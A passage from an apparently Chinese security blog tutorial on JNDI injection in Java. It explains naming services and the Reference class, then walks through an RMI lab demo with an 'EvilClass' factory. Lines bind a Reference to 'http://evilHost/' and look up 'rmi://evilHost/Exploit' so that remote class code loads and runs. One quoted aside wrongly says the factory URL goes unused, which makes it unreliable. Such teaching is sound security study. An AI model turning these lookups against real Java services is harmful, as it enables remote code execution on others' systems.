&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>最后就是将这个特殊类转化为字节码再base64一下，即可弹出想要的东西</p><p>但是加载字节码过程中会遇到java版本与javac版本不一致的问题，导致编译过程中报错</p><p><img src="https://enjoyy-1322917755.cos.ap-nanjing.myqcloud.com/image-20230225150724309.png" alt="image-20230225150724309"> </p><p>修复办法是把javac版本换成低版本</p><p><img src="https://enjoyy-1322917755.cos.ap-nanjing.myqcloud.com/image-20230225150814497.png" alt="image-20230225150814497"> </p><p>从这个图里面可以看出javac版本和java版本不一致，这时候需要去改系统环境变量，但是改了以后会导致很多破解软件失效，所以就需要直接指定javac版本了</p><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs livescript">D:<span class="hljs-string">\jdk8u65\bin\javac.exe</span> .<span class="hljs-string">\Calc.java</span> <br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>JNDI注入分析</title>
    <link href="/decemberus.com/2022/12/19/JNDI%E6%B3%A8%E5%85%A5%E5%88%86%E6%9E%90/"/>
    <url>/decemberus.com/2022/12/19/JNDI%E6%B3%A8%E5%85%A5%E5%88%86%E6%9E%90/</url>
    
    <content type="html"><![CDATA[<h1 id="JNDI注入分析"><a href="#JNDI注入分析" class="headerlink" title="JNDI注入分析"></a>JNDI注入分析</h1><h2 id="什么是JNDI"><a href="#什么是JNDI" class="headerlink" title="什么是JNDI"></a>什么是JNDI</h2><p><code>JNDI(Java Naming and Directory Interface)</code>是<code>Java</code>提供的<code>Java</code>命名和目录接口。通过调用<code>JNDI</code>的<code>API</code>可以定位资源和其他程序对象。<br><code>JNDI</code>是<code>Java EE</code>的重要部分，<code>JNDI</code>可访问的现有的目录及服务有:<code>JDBC</code>、<code>LDAP</code>、<code>RMI</code>、<code>DNS</code>、<code>NIS</code>、<code>CORBA</code>。</p><h3 id="Naming-Service-命名服务"><a href="#Naming-Service-命名服务" class="headerlink" title="Naming Service 命名服务"></a>Naming Service 命名服务</h3><p>命名服务将名称和对象进行关联，提供通过名称找到对象的操作，例如：<code>DNS</code>系统将计算机名和<code>IP</code>地址进行关联、文件系统将文件名和文件句柄进行关联等等。<br>在一些命名服务系统中，系统并不是直接将对象存储在系统中，而是保持对象的引用。引用包含了如何访问实际对象的信息。<br>其中另一个值得一提的名称服务为 <code>LDAP</code>，全称为 <code>Lightweight Directory Access Protocol</code>，即轻量级目录访问协议，其名称也是从右到左进行逐级定义，各级以逗号分隔，每级为一个 <code>name</code>&#x2F;<code>value</code> 对，以等号分隔。比如一个 <code>LDAP</code> 名称如下:</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-attribute">cn</span>=John, <span class="hljs-attribute">o</span>=Sun, <span class="hljs-attribute">c</span>=US<br></code></pre></td></tr></table></figure><p>即表示在 <code>c=US</code> 的子域中查找 <code>o=Sun</code> 的子域，再在结果中查找 <code>cn=John</code> 的对象。关于 <code>LDAP</code> 的详细介绍见后文。</p><p>在名称系统中，有几个重要的概念。<br><code>Bindings</code>: 表示一个名称和对应对象的绑定关系，比如在文件系统中文件名绑定到对应的文件，在 <code>DNS</code> 中域名绑定到对应的 <code>IP</code>。<br><code>Context</code>: 上下文，一个上下文中对应着一组名称到对象的绑定关系，我们可以在指定上下文中查找名称对应的对象。比如在文件系统中，一个目录就是一个上下文，可以在该目录中查找文件，其中子目录也可以称为子上下文 (<code>subcontext</code>)。<br><code>References</code>: 在一个实际的名称服务中，有些对象可能无法直接存储在系统内，这时它们便以引用的形式进行存储，可以理解为 <code>C/C++</code> 中的指针。引用中包含了获取实际对象所需的信息，甚至对象的实际状态。比如文件系统中实际根据名称打开的文件是一个整数 <code>fd</code> (<code>file descriptor</code>)，这就是一个引用，内核根据这个引用值去找到磁盘中的对应位置和读写偏移。</p><h3 id="Directory-Service-目录服务"><a href="#Directory-Service-目录服务" class="headerlink" title="Directory Service 目录服务"></a>Directory Service 目录服务</h3><p>目录服务是命名服务的扩展，除了提供名称和对象的关联，还允许对象具有属性。目录服务中的对象称之为目录对象。目录服务提供创建、添加、删除目录对象以及修改目录对象属性等操作。由此，我们不仅可以根据名称去查找(<code>lookup</code>)对象(并获取其对应属性)，还可以根据属性值去搜索(<code>search</code>)对象。<br>一些典型的目录服务有:<br><code>NIS</code>: <code>Network Information Service，Solaris</code> 系统中用于查找系统相关信息的目录服务；<br><code>Active Directory</code>: 为 <code>Windows</code> 域网络设计，包含多个目录服务，比如域名服务、证书服务等；<br>其他基于 <code>LDAP</code> 协议实现的目录服务；<br>总而言之，目录服务也是一种特殊的名称服务，关键区别是在目录服务中通常使用搜索(<code>search</code>)操作去定位对象，而不是简单的根据名称查找(<code>lookup</code>)去定位。<br>在下文中如果没有特殊指明，都会将名称服务与目录服务统称为目录服务。</p><h3 id="API"><a href="#API" class="headerlink" title="API"></a>API</h3><p>根据上面的介绍，我们知道目录服务是中心化网络应用的一个重要组件。使用目录服务可以简化应用中服务管理验证逻辑，集中存储共享信息。在 <code>Java</code> 应用中除了以常规方式使用名称服务(比如使用 <code>DNS</code> 解析域名)，另一个常见的用法是使用目录服务作为对象存储的系统，即用目录服务来存储和获取 <code>Java</code> 对象。<br>比如对于打印机服务，我们可以通过在目录服务中查找打印机，并获得一个打印机对象，基于这个 <code>Java</code> 对象进行实际的打印操作。<br>为此，就有了 <code>JNDI</code>，即 <code>Java</code> 的名称与目录服务接口，应用通过该接口与具体的目录服务进行交互。从设计上，<code>JNDI</code> 独立于具体的目录服务实现，因此可以针对不同的目录服务提供统一的操作接口。<br><code>JNDI</code> 架构上主要包含两个部分，即 <code>Java</code> 的应用层接口和 <code>SPI</code>，如下图所示:</p><p><img src="https://cdn.jsdelivr.net/gh/Decemberus/image/202303192027022.png" alt="JNDI架构图.png"> </p><p><code>SPI</code> 全称为 <code>Service Provider Interface</code>，即服务供应接口，主要作用是为底层的具体目录服务提供统一接口，从而实现目录服务的可插拔式安装。在 <code>JDK</code> 中包含了下述内置的目录服务:<br><code>RMI</code>: <code>Java Remote Method Invocation</code>，<code>Java</code> 远程方法调用；<br><code>LDAP</code>: 轻量级目录访问协议；<br><code>CORBA</code>: <code>Common Object Request Broker Architecture</code>，通用对象请求代理架构，用于 <code>COS</code> 名称服务(<code>Common Object Services</code>)；<br>除此之外，用户还可以在 <code>Java</code> 官网下载其他目录服务实现。由于 <code>SPI</code> 的统一接口，厂商也可以提供自己的私有目录服务实现，用户可无需重复修改代码。<br>为了更好理解 <code>JNDI</code>，我们需要了解其背后的服务提供者(<code>Service Provider</code>)，这些目录服务本身和 <code>JNDI</code> 有没直接耦合性，但基于 <code>SPI</code> 接口和 <code>JNDI</code> 构建起了重要的联系。</p><h2 id="JNDI的结构"><a href="#JNDI的结构" class="headerlink" title="JNDI的结构"></a>JNDI的结构</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java">javax.naming：主要用于命名操作,包含了访问目录服务所需的类和接口，比如 Context、Bindings、References、lookup 等。<br>javax.naming.directory：主要用于目录操作，它定义了DirContext接口和InitialDir- Context类；<br>javax.naming.event：在命名目录服务器中请求事件通知；<br>javax.naming.ldap：提供LDAP支持；<br>javax.naming.spi：允许动态插入不同实现，为不同命名目录服务供应商的开发人员提供开发和实现的途径，以便应用程序通过JNDI可以访问相关服务。<br></code></pre></td></tr></table></figure><h3 id="类介绍"><a href="#类介绍" class="headerlink" title="类介绍"></a>类介绍</h3><h4 id="InitialContext类"><a href="#InitialContext类" class="headerlink" title="InitialContext类"></a>InitialContext类</h4><p>构造方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java">InitialContext();<br><span class="hljs-comment">//构建一个初始上下文</span><br>InitialContext();<br><span class="hljs-comment">//构建上下文并选择不初始化它</span><br>InitialContext(Hashtable&lt;?,?&gt; environment)<br><span class="hljs-comment">//使用提供的环境构建初始上下文</span><br></code></pre></td></tr></table></figure><p>常用方法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//将名称绑定到对象。 </span><br>bind(Name name, Object obj) <br><span class="hljs-comment">//枚举在命名上下文中绑定的名称以及绑定到它们的对象的类名。</span><br>list(String name) <br><span class="hljs-comment">//检索命名对象。</span><br>lookup(String name)  <br><span class="hljs-comment">//将名称绑定到对象，覆盖任何现有绑定。</span><br>rebind(String name, Object obj) <br><span class="hljs-comment">//取消绑定命名对象。</span><br>unbind(String name)  <br></code></pre></td></tr></table></figure><p>实例如下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> javax.naming.InitialContext;<br><span class="hljs-keyword">import</span> javax.naming.NamingException;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">JNDI</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> NamingException &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">uri</span> <span class="hljs-operator">=</span><span class="hljs-string">&quot;rmi://127.0.0.1:1099/work&quot;</span>;<br>        <span class="hljs-type">InitialContext</span> <span class="hljs-variable">ini</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InitialContext</span>();<br>        ini.lookup(uri);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>这段代码中lookup会去uri中查找对应对象并返回引用</p><h4 id="Reference类"><a href="#Reference类" class="headerlink" title="Reference类"></a>Reference类</h4><p>该类也是在<code>javax.naming</code>的一个类，该类表示对在命名&#x2F;目录系统外部找到的对象的引用。提供了<code>JNDI</code>中类的引用功能。</p><p>构造方法:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//为类名为“className”的对象构造一个新的引用。</span><br>Reference(String className) <br><span class="hljs-comment">//为类名为“className”的对象和地址构造一个新引用。 </span><br>Reference(String className, RefAddr addr) <br><span class="hljs-comment">//为类名为“className”的对象，对象工厂的类名和位置以及对象的地址构造一个新引用。 </span><br>Reference(String className, RefAddr addr, String factory, String factoryLocation) <br><span class="hljs-comment">//为类名为“className”的对象以及对象工厂的类名和位置构造一个新引用。  </span><br>Reference(String className, String factory, String factoryLocation)<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment">参数：</span><br><span class="hljs-comment">className 远程加载时所使用的类名(引用名称)</span><br><span class="hljs-comment">factory  加载的class中需要实例化类的名称（引用类型）</span><br><span class="hljs-comment">factoryLocation  提供classes数据的地址可以是file/ftp/http协议</span><br><span class="hljs-comment">*/</span><br></code></pre></td></tr></table></figure><p>常用方法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//将地址添加到索引posn的地址列表中。</span><br><span class="hljs-keyword">void</span> <span class="hljs-title function_">add</span><span class="hljs-params">(<span class="hljs-type">int</span> posn, RefAddr addr)</span> <br><span class="hljs-comment">//将地址添加到地址列表的末尾。 </span><br><span class="hljs-keyword">void</span> <span class="hljs-title function_">add</span><span class="hljs-params">(RefAddr addr)</span> <br><span class="hljs-comment">//从此引用中删除所有地址。  </span><br><span class="hljs-keyword">void</span> <span class="hljs-title function_">clear</span><span class="hljs-params">()</span> <br><span class="hljs-comment">//检索索引posn上的地址。 </span><br>RefAddr <span class="hljs-title function_">get</span><span class="hljs-params">(<span class="hljs-type">int</span> posn)</span> <br><span class="hljs-comment">//检索地址类型为“addrType”的第一个地址。  </span><br>RefAddr <span class="hljs-title function_">get</span><span class="hljs-params">(String addrType)</span> <br><span class="hljs-comment">//检索本参考文献中地址的列举。 </span><br>Enumeration&lt;RefAddr&gt; <span class="hljs-title function_">getAll</span><span class="hljs-params">()</span> <br><span class="hljs-comment">//检索引用引用的对象的类名。 </span><br>String <span class="hljs-title function_">getClassName</span><span class="hljs-params">()</span> <br><span class="hljs-comment">//检索此引用引用的对象的工厂位置。  </span><br>String <span class="hljs-title function_">getFactoryClassLocation</span><span class="hljs-params">()</span> <br><span class="hljs-comment">//检索此引用引用对象的工厂的类名。  </span><br>String <span class="hljs-title function_">getFactoryClassName</span><span class="hljs-params">()</span> <br><span class="hljs-comment">//从地址列表中删除索引posn上的地址。    </span><br>Object <span class="hljs-title function_">remove</span><span class="hljs-params">(<span class="hljs-type">int</span> posn)</span> <br><span class="hljs-comment">//检索此引用中的地址数。 </span><br><span class="hljs-type">int</span> <span class="hljs-title function_">size</span><span class="hljs-params">()</span> <br><span class="hljs-comment">//生成此引用的字符串表示形式。</span><br>String <span class="hljs-title function_">toString</span><span class="hljs-params">()</span> <br></code></pre></td></tr></table></figure><p>实例</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> com.sun.jndi.rmi.registry.ReferenceWrapper;<br><span class="hljs-keyword">import</span> javax.naming.Reference;<br><span class="hljs-keyword">import</span> java.rmi.registry.LocateRegistry;<br><span class="hljs-keyword">import</span> java.rmi.registry.Registry;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Renference</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span><span class="hljs-keyword">throws</span> Exception &#123;<br>        String url=<span class="hljs-string">&quot;rmi://127.0.0.1:8080&quot;</span>;<br>        <span class="hljs-type">Registry</span> <span class="hljs-variable">registry</span> <span class="hljs-operator">=</span> LocateRegistry.createRegistry(<span class="hljs-number">1099</span>);<br>        <span class="hljs-type">Reference</span> <span class="hljs-variable">renference</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Reference</span>(<span class="hljs-string">&quot;test&quot;</span>, <span class="hljs-string">&quot;test&quot;</span>, url);<br>        <span class="hljs-type">ReferenceWrapper</span> <span class="hljs-variable">referenceWrapper</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ReferenceWrapper</span>(renference);<br>        registry.bind(<span class="hljs-string">&quot;aa&quot;</span>,referenceWrapper);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>主要问题在于为何使用了<code>ReferenceWrapper</code></p><p>因为<code>Reference</code>类没有实现<code>Remote</code>和继承<code>UnicastRemoteObject</code>类，所以需要用<code>ReferenceWrapper</code>封装一下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//ReferenceWrapper.java</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ReferenceWrapper</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">UnicastRemoteObject</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">RemoteReference</span> &#123;<br>    <span class="hljs-keyword">protected</span> Reference wrappee;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">long</span> <span class="hljs-variable">serialVersionUID</span> <span class="hljs-operator">=</span> <span class="hljs-number">6078186197417641456L</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">ReferenceWrapper</span><span class="hljs-params">(Reference var1)</span> <span class="hljs-keyword">throws</span> NamingException, RemoteException &#123;<br>        <span class="hljs-built_in">this</span>.wrappee = var1;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> Reference <span class="hljs-title function_">getReference</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> RemoteException &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>.wrappee;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><blockquote><p>关于继承<code>UnicastRemoteObject</code>的原因</p><p>在Java RMI中，要将一个远程对象导出（即使其成为远程可调用的对象），需要将其扩展为<code>java.rmi.server.UnicastRemoteObject</code>类的子类。这是因为<code>UnicastRemoteObject</code>类提供了一些必要的支持，使得对象能够在远程机器上进行调用。</p><p>具体来说，当一个Java对象通过RMI被远程调用时，需要进行序列化（即将对象转换成一系列字节，以便在网络上传输），然后将序列化后的字节传输到远程机器上进行反序列化（即将字节重新转换成对象）。<code>UnicastRemoteObject</code>类提供了默认的序列化和反序列化机制，以及一些基础的RMI支持。</p></blockquote><h2 id="JNDI-References注入"><a href="#JNDI-References注入" class="headerlink" title="JNDI References注入"></a>JNDI References注入</h2><p>为了在命名服务或目录服务中绑定<code>Java</code>对象，可以使用<code>Java</code>序列化来传输对象，但有时候不太合适，比如<code>Java</code>对象较大的情况。因此JNDI定义了命名引用(<code>Naming References</code>)，后面直接简称引用(<code>References</code>)。这样对象就可以通过绑定一个可以被命名管理器(<code>Naming Manager</code>)解码并解析为原始对象的引用，间接地存储在命名或目录服务中。<br>引用由<code>Reference</code>类来表示，它由地址(<code>RefAddress</code>)的有序列表和所引用对象的信息组成。而每个地址包含了如何构造对应的对象的信息，包括引用对象的<code>Java</code>类名，以及用于创建对象的<code>ObjectFactory</code>类的名称和位置。<br><code>Reference</code>可以使用<code>ObjectFactory</code>来构造对象。当使用<code>lookup()</code>方法查找对象时，<code>Reference</code>将使用提供的<code>ObjectFactory</code>类的加载地址来加载<code>ObjectFactory</code>类，<code>ObjectFactory</code>类将构造出需要的对象。</p><p>所谓的 <code>JNDI</code> 注入就是控制 <code>lookup</code> 函数的参数，这样来使客户端访问恶意的 <code>RMI</code> 或者 <code>LDAP</code> 服务来加载恶意的对象，从而执行代码，完成利用<br>在 <code>JNDI</code> 服务中，通过绑定一个外部远程对象让客户端请求，从而使客户端恶意代码执行的方式就是利用 <code>Reference</code> 类实现的。<code>Reference</code> 类表示对存在于命名&#x2F;目录系统以外的对象的引用。<br>具体则是指如果远程获取 <code>RMI</code> 服务器上的对象为 <code>Reference</code> 类或者其子类时，则可以从其他服务器上加载 <code>class</code> 字节码文件来实例化</p><p><code>Reference</code> 类常用属性：</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs angelscript">className 远程加载时所使用的类名<br>classFactory 加载的 <span class="hljs-keyword">class</span> 中需要实例化类的名称<br><span class="hljs-symbol">classFactoryLocation</span> 提供 <span class="hljs-symbol">classes</span> 数据的地址可以是 <span class="hljs-symbol">file</span>/<span class="hljs-symbol">ftp</span>/<span class="hljs-symbol">http</span> 等协议<br></code></pre></td></tr></table></figure><p>例如</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Reference</span> <span class="hljs-variable">reference</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Reference</span>(<span class="hljs-string">&quot;Exploit&quot;</span>,<span class="hljs-string">&quot;Exploit&quot;</span>,<span class="hljs-string">&quot;http://evilHost/&quot;</span> );           <br>registry.bind(<span class="hljs-string">&quot;Exploit&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">ReferenceWrapper</span>(reference));<br></code></pre></td></tr></table></figure><p>此时，假设使用 <code>rmi</code> 协议，客户端通过 <code>lookup</code> 函数请求上面 <code>bind</code> 设置的 <code>Exploit</code></p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs abnf">Context ctx <span class="hljs-operator">=</span> new InitialContext()<span class="hljs-comment">;</span><br>ctx.lookup(<span class="hljs-string">&quot;rmi://evilHost/Exploit&quot;</span>)<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure><p>因为绑定的是 <code>Reference</code> 对象，客户端在本地 <code>CLASSPATH</code> 查找 <code>Exploit</code> 类，如果没有则根据设定的 <code>Reference</code> 属性，到<code>URL</code>： <a href="http://evilhost/Exploit.class">http://evilHost/Exploit.class</a> 获取构造对象实例，构造方法中的恶意代码就会被执行</p><h2 id="JNDI-RMI"><a href="#JNDI-RMI" class="headerlink" title="JNDI_RMI"></a>JNDI_RMI</h2><h3 id="低版本JDK运行"><a href="#低版本JDK运行" class="headerlink" title="低版本JDK运行"></a>低版本JDK运行</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//Client</span><br><span class="hljs-keyword">import</span> javax.naming.InitialContext;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Client</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span><span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">lookup</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InitialContext</span>().lookup(<span class="hljs-string">&quot;rmi://127.0.0.1:1099/foo&quot;</span>);<br>        System.out.println(<span class="hljs-string">&quot;ret&quot;</span>+lookup);<br><br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><blockquote><p>“foo”并不是一个类，而是在服务器端绑定到 RMI 注册表上的一个对象名称（Object name）。当客户端使用 <code>InitialContext().lookup(&quot;rmi://127.0.0.1:1099/foo&quot;)</code> 查找时，它会返回该名称下对应的对象，即 <code>EvilClass</code>。</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//Server</span><br><br><span class="hljs-keyword">import</span> com.sun.jndi.rmi.registry.ReferenceWrapper;<br><br><span class="hljs-keyword">import</span> javax.naming.NamingException;<br><span class="hljs-keyword">import</span> javax.naming.Reference;<br><span class="hljs-keyword">import</span> java.rmi.AlreadyBoundException;<br><span class="hljs-keyword">import</span> java.rmi.RemoteException;<br><span class="hljs-keyword">import</span> java.rmi.registry.LocateRegistry;<br><span class="hljs-keyword">import</span> java.rmi.registry.Registry;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Server</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> RemoteException, NamingException, AlreadyBoundException &#123;<br>        <span class="hljs-type">Registry</span> <span class="hljs-variable">registry</span> <span class="hljs-operator">=</span> LocateRegistry.createRegistry(<span class="hljs-number">1099</span>);<br>        String url=<span class="hljs-string">&quot;http://localhost:1098/&quot;</span>;<br>        <span class="hljs-type">Reference</span> <span class="hljs-variable">reference</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Reference</span>(<span class="hljs-string">&quot;EvilClass&quot;</span>, <span class="hljs-string">&quot;EvilClass&quot;</span>, url);<br>        registry.bind(<span class="hljs-string">&quot;foo&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">ReferenceWrapper</span>(reference));<br>        System.out.println(<span class="hljs-string">&quot;server ready&quot;</span>);<br><br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//EvilClass</span><br><span class="hljs-keyword">import</span> javax.naming.Context;<br><span class="hljs-keyword">import</span> javax.naming.Name;<br><span class="hljs-keyword">import</span> javax.naming.spi.ObjectFactory;<br><span class="hljs-keyword">import</span> java.util.Hashtable;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">EvilClass</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">ObjectFactory</span> &#123;<br>    <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">log</span><span class="hljs-params">(String key)</span>&#123;<br>        System.out.println(<span class="hljs-string">&quot;EvilClass&quot;</span>+key);<br>    &#125;<br><br>    &#123;<br>        EvilClass.log(<span class="hljs-string">&quot;IIB block&quot;</span>);<br>    &#125;<span class="hljs-comment">//在创建对象时执行</span><br><br>    <span class="hljs-keyword">static</span> &#123;<br>        EvilClass.log(<span class="hljs-string">&quot;static block&quot;</span>);<br>    &#125;<span class="hljs-comment">//在类第一次加载时执行</span><br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> Object <span class="hljs-title function_">getObjectInstance</span><span class="hljs-params">(Object obj, Name name, Context nameCtx, Hashtable&lt;?, ?&gt; environment)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        EvilClass.log(<span class="hljs-string">&quot;getObjectInstance&quot;</span>);<br>        <span class="hljs-keyword">return</span>  <span class="hljs-literal">null</span>;<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>python启动http服务器</p><p><img src="https://cdn.jsdelivr.net/gh/Decemberus/image/202303192027659.png" alt="image-20230226191821488"> </p><blockquote><p>关于这里的端口号有的是1098有的是1099的疑问</p><p>这是因为在服务器端代码 <code>Server.java</code> 中，创建 <code>Reference</code> 对象时，将 <code>url</code> 参数设置为了 <code>&quot;http://localhost:1098/&quot;</code>。这个 URL 是指向一个 HTTP 服务器的地址，而在 <code>getObjectInstance</code> 方法中，并没有使用该 URL，所以在客户端代码中使用 <code>rmi://127.0.0.1:1099/foo</code> 查找时仍然可以返回正确的对象。</p><p>虽然这个示例代码中的 <code>url</code> 参数没有被实际使用到，但是实际上 <code>url</code> 参数用来指定引用对象的远程位置，这个远程位置可以是任何类型的 URL。如果您想要将 <code>url</code> 参数用于远程加载对象，则需要确保在 <code>getObjectInstance</code> 方法中能够正确地解析该 URL，加载对应的对象。</p></blockquote><p>将EvilClass的.class文件放入服务器根目录</p><p><img src="D:/mdimage/image-20230226192019661.png" alt="image-20230226192019661"> </p><p>启动服务端</p><p><img 